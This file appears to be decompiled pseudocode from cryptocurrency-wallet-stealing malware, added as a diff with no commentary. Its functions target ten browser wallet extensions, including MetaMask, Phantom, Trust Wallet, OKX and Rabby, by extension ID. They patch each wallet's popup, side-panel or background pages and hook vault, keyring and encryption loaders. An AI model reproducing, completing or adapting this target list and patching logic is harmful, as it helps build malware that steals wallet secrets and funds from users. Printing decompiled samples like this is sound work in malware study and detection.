@@ -1,0 +1,221 @@
+function func_initWallets_0x10000b814()
+{
+	r3 = 0
+	ACCU = func_Metamask_0x10000b7c0()
+	ACCU = func_patchPhantom_0x10000b7cc()
+	ACCU = func_extractTrustWallet_0x10000b7d3()
+	ACCU = func_okxWallet_0x10000b7de()
+	ACCU = func_patchTronlink_0x10000b7e6()
+	ACCU = func_initPatch_0x10000b7ed()
+	ACCU = func_extractRabby_0x10000b7f3()
+	ACCU = func_wallet_0x10000b7fb()
+	ACCU = func_initPatch_0x10000b803()
+	ACCU = func_patchTokenPocket_0x10000b80b()
+	r8 = new [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+	r8[0] = global_Gz
+	r8[1] = global_Mz
+	r8[2] = global_jz
+	r8[3] = global_Kz
+	r8[4] = global_Uz
+	r8[5] = global_mD
+	r8[6] = global_Hz
+	r8[7] = global_Yz
+	r8[8] = global_Zz
+	r8[9] = global_$z
+	global_zT = r8
+	return undefined
+}
+function func_patchTokenPocket_0x10000b80b()
+{
+	Scope[1515][6] = func_n_0x10000b804
+	ACCU = func_noop_0x10000b7b1()
+	ACCU = func_invoke_0x10000b7b9()
+	r5 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r5["type"] = "TOKENPOCKET_EXTENSION"
+	r7 = new [0]
+	r7[0] = "mfgccjchihfkkindfppnaooecgfneiii"
+	r5["extensions"] = r7
+	r7 = new [0]
+	r7[0] = func_patch_0x10000066f("main", "popup.html")
+	r5["patches"] = r7
+	r5["minify"] = func_LoadKeyring_0x10000b80a
+	global_$z = func_extractPatches_0x10000066a(r5)
+	return undefined
+}
+function func_initPatch_0x10000b803()
+{
+	Scope[1518][5] = func_u_0x10000b7fc
+	ACCU = func_noop_0x10000b7b1()
+	ACCU = func_invoke_0x10000b7b9()
+	r5 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r5["type"] = "RAINBOW_EXTENSION"
+	r7 = new [0, 0]
+	r7[0] = "opfgelmcmbiajamepnmloijbpoleiama"
+	r7[1] = "cpojfbodiccabbabgimdeohkkpjfpbnf"
+	r5["extensions"] = r7
+	r7 = new [0]
+	r7[0] = func_patch_0x10000066f("main", "popup.html")
+	r5["patches"] = r7
+	r5["minify"] = func_LoadVault_0x10000b802
+	global_Zz = func_extractPatches_0x10000066a(r5)
+	return undefined
+}
+function func_wallet_0x10000b7fb()
+{
+	Scope[1522][6] = func_n_0x10000b7f4
+	ACCU = func_noop_0x10000b7b1()
+	ACCU = func_invoke_0x10000b7b9()
+	r5 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r5["type"] = "RONIN_WALLET_EXTENSION"
+	r7 = new [0, 0]
+	r7[0] = "fnjhmkhhmkbjkkabndcnnogagogbneec"
+	r7[1] = "kjmoohlgokccodicjjfebfomlbljgfhk"
+	r5["extensions"] = r7
+	r7 = new [0, 0, 0]
+	r7[0] = func_patch_0x10000066f("main", "popup.html", true)
+	r11 = "main"
+	r12 = (require("path"))["join"]
+	r12 = r12("src", "pages", "popup", "popup.html")
+	r7[1] = func_patch_0x10000066f(r11, r12, true)
+	r11 = "main"
+	r12 = (require("path"))["join"]
+	r12 = r12("src", "pages", "sidepanel", "index.html")
+	r7[2] = func_patch_0x10000066f(r11, r12, true)
+	r5["patches"] = r7
+	r5["minify"] = func_minifyWallet_0x10000b7fa
+	global_Yz = func_extractPatches_0x10000066a(r5)
+	return undefined
+}
+function func_extractRabby_0x10000b7f3()
+{
+	r4 = 0
+	ACCU = func_initPatch_0x10000b7ed()
+	ACCU = func_invoke_0x10000b7b9()
+	ACCU = func_noop_0x10000b7b1()
+	r10 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r10["type"] = "RABBY_WALLET_EXTENSION"
+	r12 = new [0]
+	r12[0] = "acmacodkjbdgmoleebolmdjonilkdbch"
+	r10["extensions"] = r12
+	r12 = new [0]
+	r14 = r2
+	r12[0] = func_patch_0x10000066f("main", "popup.html")
+	r10["patches"] = r12
+	r10["minify"] = global_mD["minify"]
+	global_Hz = func_extractPatches_0x10000066a(r10)
+	return undefined
+}
+function func_initPatch_0x10000b7ed()
+{
+	Scope[1527][6] = func_n_0x10000b7e7
+	ACCU = func_noop_0x10000b7b1()
+	ACCU = func_invoke_0x10000b7b9()
+	r5 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r5["type"] = "BYBIT_WALLET_EXTENSION"
+	r7 = new [0]
+	r7[0] = "pdliaogehgdbhbnmkklieghmmjkpigpa"
+	r5["extensions"] = r7
+	r7 = new [0]
+	r7[0] = func_patch_0x10000066f("main", "popup.html")
+	r5["patches"] = r7
+	r5["minify"] = func_loadVault_0x10000b7ec
+	global_mD = func_extractPatches_0x10000066a(r5)
+	return undefined
+}
+function func_patchTronlink_0x10000b7e6()
+{
+	Scope[1530][6] = func_n_0x10000b7df
+	ACCU = func_noop_0x10000b7b1()
+	ACCU = func_invoke_0x10000b7b9()
+	r5 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r5["type"] = "TRONLINK_EXTENSION"
+	r7 = new [0]
+	r7[0] = "ibnejdfjmmkpcnlpebklmnkoeoihofec"
+	r5["extensions"] = r7
+	r7 = new [0]
+	r11 = "main"
+	r12 = (require("path"))["join"]
+	r12 = r12("popup", "popup.html")
+	r7[0] = func_patch_0x10000066f(r11, r12)
+	r5["patches"] = r7
+	r5["minify"] = func_loadVault_0x10000b7e5
+	global_Uz = func_extractPatches_0x10000066a(r5)
+	return undefined
+}
+function func_okxWallet_0x10000b7de()
+{
+	Scope[1533][6] = func_n_0x10000b7d4
+	ACCU = func_noop_0x10000b7b1()
+	ACCU = func_initProxy_0x10000703d()
+	ACCU = func_invoke_0x10000b7b9()
+	r5 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r5["type"] = "OKX_WALLET_EXTENSION"
+	r7 = new [0, 0]
+	r7[0] = "mcohilncbfahbmgdjkbpemcciiolgcge"
+	r7[1] = "pbpjkcldjiffchgbbndmhojiacbgflha"
+	r5["extensions"] = r7
+	r7 = new [0, 0]
+	r7[0] = func_patch_0x10000066f("main", "popup.html")
+	r11 = "runtimeId"
+	r12 = (require("path"))["join"]
+	r12 = r12("scripts", "background", "background.js")
+	r7[1] = func_CreateGuard_0x100000672(r11, r12)
+	r5["patches"] = r7
+	r5["minify"] = func_encryptVault_0x10000b7dd
+	global_Kz = func_extractPatches_0x10000066a(r5)
+	return undefined
+}
+function func_extractTrustWallet_0x10000b7d3()
+{
+	Scope[1536][5] = func_u_0x10000b7cd
+	ACCU = func_noop_0x10000b7b1()
+	ACCU = func_invoke_0x10000b7b9()
+	r5 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r5["type"] = "TRUST_WALLET_EXTENSION"
+	r7 = new [0]
+	r7[0] = "egjidjbpglichdcondbcbdnbeeppgdph"
+	r5["extensions"] = r7
+	r7 = new [0]
+	r7[0] = func_patch_0x10000066f("main", "popup.html")
+	r5["patches"] = r7
+	r5["minify"] = func_minify_0x10000b7d2
+	global_jz = func_extractPatches_0x10000066a(r5)
+	return undefined
+}
+function func_patchPhantom_0x10000b7cc()
+{
+	Scope[1540][7] = func_o_0x10000b7c1
+	ACCU = func_noop_0x10000b7b1()
+	ACCU = func_invoke_0x10000b7b9()
+	r5 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r5["type"] = "PHANTOM_EXTENSION"
+	r7 = new [0]
+	r7[0] = "bfnaelmomeimhlpmgjnjophhpkkoljpa"
+	r5["extensions"] = r7
+	r7 = new [0]
+	r7[0] = func_patch_0x10000066f("main", "popup.html")
+	r5["patches"] = r7
+	r5["minify"] = func_loadVault_0x10000b7cb
+	global_Mz = func_extractPatches_0x10000066a(r5)
+	return undefined
+}
+function func_Metamask_0x10000b7c0()
+{
+	Scope[1546][6] = func_n_0x10000b7ba
+	ACCU = func_noop_0x10000b7b1()
+	ACCU = func_invoke_0x10000b7b9()
+	r5 = new {"type": null, "extensions": null, "patches": null, "minify": null}
+	r5["type"] = "METAMASK_EXTENSION"
+	r7 = new [0, 0, 0]
+	r7[0] = "nkbihfbeogaeaoehlefnkodbefgpgknn"
+	r7[1] = "ejbalbakoplchlghecdalmeeeajnimhm"
+	r7[2] = "djclckkglechooblngghdinmeemkbgci"
+	r5["extensions"] = r7
+	r7 = new [0, 0]
+	r7[0] = func_patch_0x10000066f("main", "popup.html")
+	r7[1] = func_patch_0x10000066f("main", "home.html")
+	r5["patches"] = r7
+	r5["minify"] = func_load_0x10000b7bf
+	global_Gz = func_extractPatches_0x10000066a(r5)
+	return undefined
+}
